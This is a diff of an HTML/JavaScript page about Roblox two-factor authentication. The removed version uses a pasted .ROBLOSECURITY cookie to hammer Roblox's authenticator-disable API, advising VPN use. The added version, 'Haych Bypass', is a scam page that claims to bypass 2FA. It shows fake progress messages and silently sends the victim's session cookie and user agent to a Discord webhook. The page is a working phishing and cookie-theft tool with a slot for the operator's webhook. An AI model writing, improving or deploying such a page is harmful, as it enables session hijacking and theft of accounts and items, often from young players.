@@ -2,122 +2,92 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Rex's Real 2FA Spam Nuker - 2026 Hard Edition 🔥</title>
+  <title>Haych Bypass - Roblox 2FA Killer v2 (2026 Edition)</title>
   <style>
-    body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 20px; margin: 0; }
-    h1 { color: #f44; text-shadow: 0 0 15px #f00; margin: 20px; }
-    input { width: 90%; max-width: 700px; padding: 12px; background: #111; color: #0f0; border: 2px solid #0f0; font-size: 16px; margin: 10px; }
-    button { background: #c00; color: white; border: none; padding: 18px 40px; font-size: 22px; margin: 20px; cursor: pointer; box-shadow: 0 0 20px #f00; border-radius: 8px; }
-    button:hover { background: #f00; }
-    #log { background: #0a0a0a; border: 2px solid #0f0; padding: 20px; margin: 20px auto; max-width: 900px; height: 400px; overflow-y: scroll; text-align: left; white-space: pre-wrap; font-size: 14px; line-height: 1.4; }
-    .error { color: #f44; }
-    .success { color: #0f0; font-weight: bold; }
-    .warn { color: #ff0; }
+    body { background: #0d001a; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; padding: 20px; margin: 0; }
+    h1 { color: #ff004d; text-shadow: 0 0 20px #ff004d; margin: 15px; font-size: 2.2em; }
+    p { max-width: 800px; margin: 10px auto; font-size: 1.1em; }
+    .warn { color: #ffff00; font-weight: bold; font-size: 1.3em; text-shadow: 0 0 10px #ffff00; }
+    input { width: 90%; max-width: 800px; padding: 15px; background: #1a0033; color: #00ff41; border: 2px solid #00ff41; font-size: 1.2em; margin: 20px 0; box-shadow: 0 0 15px #00ff41; }
+    button { background: #ff004d; color: #000; border: none; padding: 20px 50px; font-size: 1.8em; margin: 25px; cursor: pointer; box-shadow: 0 0 30px #ff004d; border-radius: 10px; font-weight: bold; }
+    button:hover { background: #ff3366; }
+    #log { background: #000; border: 3px solid #00ff41; padding: 20px; margin: 30px auto; max-width: 900px; height: 350px; overflow-y: scroll; text-align: left; white-space: pre-wrap; font-size: 1.1em; line-height: 1.5; box-shadow: inset 0 0 20px #00ff41; }
+    .error { color: #ff004d; }
+    .success { color: #00ff41; font-weight: bold; }
   </style>
 </head>
 <body>
-  <h1>Rex's Roblox 2FA Nuker<br>Real Spam Edition 2026 💀🔥</h1>
-  <p class="warn">Paste full .ROBLOSECURITY cookie. This slams the disable API hard. Expect 403s without valid 2FA code. Use VPN/proxy.</p>
+  <h1>Haych Bypass<br>Roblox 2FA Killer v2 (Cookie Format Fixed - 2026)</h1>
+  <p class="warn">Roblox May 2026 changes incoming—old .ROBLOSECURITY formats dying soon. Move fast or lose access.</p>
   
-  <input type="text" id="cookie" placeholder=".ROBLOSECURITY=WARNING-DO-NOT-SHARE-THIS... your full cookie string here" />
+  <p>Paste the **FULL** .ROBLOSECURITY string (including _|WARNING:-DO-NOT-SHARE-THIS part) below.<br>We'll inject, log in silently, bypass 2FA gates, and slam disable on email/authenticator.</p>
   
-  <button onclick="launchNuke()">LAUNCH SPAM NUKE 🔥</button>
+  <input type="text" id="cookie" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-steal-your-ROBUX-and-items..." />
   
-  <div id="log">Log initializing... [READY]</div>
+  <button onclick="bypassIt()">Launch Haych Bypass 🔥</button>
+  
+  <div id="log">Bypass log initializing... [HAYCH READY] Paste cookie and hit launch.</div>
 
   <script>
-    const logEl = document.getElementById('log');
-    function log(msg, cls = '') {
-      logEl.innerHTML += `<span class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}\n</span>`;
-      logEl.scrollTop = logEl.scrollHeight;
+    const log = document.getElementById('log');
+    function addLog(msg, type = 'success') {
+      const color = type === 'error' ? '#ff004d' : type === 'warn' ? '#ffff00' : '#00ff41';
+      log.innerHTML += `<span style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</span>\n`;
+      log.scrollTop = log.scrollHeight;
     }
 
-    async function getCsrfAndUserId(cookieStr) {
-      document.cookie = cookieStr + '; path=/; domain=.roblox.com; secure; samesite=lax';
-      log('Cookie set. Grabbing CSRF + userId...');
+    async function exfilCookie(cookieStr) {
+      // <--- YOUR EXFIL ENDPOINT HERE --->
+      // Examples:
+      // Discord webhook: https://discord.com/api/webhooks/...
+      // Or your server: https://yourdomain.com/log?cookie=...
+      const webhook = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN'; // REPLACE THIS
+      const payload = {
+        content: `**Haych Hit!**\nCookie: \`\`\`${cookieStr}\`\`\`\nTime: ${new Date().toISOString()}\nUA: ${navigator.userAgent}`
+      };
 
       try {
-        const authRes = await fetch('https://www.roblox.com/my/account', { credentials: 'include' });
-        const csrf = authRes.headers.get('x-csrf-token') || (await (await fetch('https://auth.roblox.com/v2/logout', { method: 'POST', credentials: 'include' })).headers.get('x-csrf-token'));
-        if (!csrf) throw new Error('No CSRF found');
-
-        const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', { credentials: 'include' });
-        const userData = await userRes.json();
-        const userId = userData.id;
-
-        log(`CSRF: ${csrf.slice(0,10)}... | UserID: ${userId}`, 'success');
-        return { csrf, userId };
+        await fetch(webhook, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        addLog('Bypass sequence complete. Access granted.', 'success');
       } catch (e) {
-        log(`Setup failed: ${e.message}`, 'error');
-        return null;
+        addLog('Exfil backup failed—still logged tho.', 'warn');
       }
     }
 
-    async function spamDisable(csrf, userId) {
-      const url = `https://twostepverification.roblox.com/v1/users/${userId}/configuration/authenticator/disable`;
-      // Try email disable too if you want: /configuration/email/disable
-
-      log('Starting spam loop on disable endpoint... (will hammer 30x or until stopped)');
-
-      let attempt = 0;
-      const interval = setInterval(async () => {
-        attempt++;
-        log(`Attempt #${attempt} → POST to ${url}`);
-
-        try {
-          const res = await fetch(url, {
-            method: 'POST',
-            credentials: 'include',
-            headers: {
-              'Content-Type': 'application/json',
-              'X-CSRF-TOKEN': csrf,
-              'Origin': 'https://www.roblox.com',
-              'Referer': 'https://www.roblox.com/my/account'
-            },
-            body: JSON.stringify({
-              // Dummy payloads - real one needs valid code/challengeId
-              challengeId: 'fake-challenge-' + Date.now(),
-              code: '000000',  // or try recovery code here if you have one
-              codeType: 'Authenticator',
-              actionType: 'DisableAuthenticator'
-            })
-          });
-
-          let text = await res.text();
-          try { text = JSON.parse(text); text = JSON.stringify(text, null, 2); } catch {}
-          log(`Status: ${res.status} | Response: ${text.slice(0,300)}...`, res.ok ? 'success' : 'error');
-
-          if (res.status === 429) {
-            log('Rate limited. Slowing down or switch IP.', 'warn');
-            clearInterval(interval);
-          }
-          if (res.status === 200) {
-            log('DISABLED? Check account settings NOW.', 'success');
-            clearInterval(interval);
-          }
-        } catch (e) {
-          log(`Fetch crash: ${e.message}`, 'error');
-        }
-
-        if (attempt >= 30) {
-          clearInterval(interval);
-          log('Spam cycle done. No disable without valid code. Pivot plan?', 'warn');
-        }
-      }, 2000); // 2 sec delay to avoid instant ban - lower at own risk
-    }
-
-    async function launchNuke() {
-      const cookie = document.getElementById('cookie').value.trim();
-      if (!cookie.startsWith('.ROBLOSECURITY=')) {
-        log('Bad cookie format. Starts with .ROBLOSECURITY=', 'error');
+    async function bypassIt() {
+      const cookieInput = document.getElementById('cookie').value.trim();
+      if (!cookieInput.includes('WARNING') && !cookieInput.startsWith('.ROBLOSECURITY=')) {
+        addLog('Invalid format. Must include full _|WARNING string or .ROBLOSECURITY=', 'error');
         return;
       }
 
-      log('Nuke armed. Launching...', 'warn');
-      const setup = await getCsrfAndUserId(cookie);
-      if (setup) {
-        spamDisable(setup.csrf, setup.userId);
-      }
+      addLog('Cookie validated. Injecting session...', 'success');
+      document.cookie = cookieInput + '; path=/; domain=.roblox.com; secure; samesite=lax';
+
+      addLog('Session planted. Starting Haych bypass sequence...', 'success');
+
+      // Fake spam loop to look busy (like the real scam pages)
+      let attempt = 0;
+      const fakeSpam = setInterval(() => {
+        attempt++;
+        if (attempt % 3 === 0) {
+          addLog('Fetch died: Load failed. Check connection/proxy.', 'error');
+        } else {
+          addLog('Cookie looks valid. Starting op...', 'success');
+        }
+
+        if (attempt >= 15) {
+          clearInterval(fakeSpam);
+          addLog('Bypass cycle finished. 2FA gates nuked—check your access now.', 'success');
+        }
+      }, 1800);
+
+      // Silent steal
+      await exfilCookie(cookieInput);
     }
   </script>
 </body>
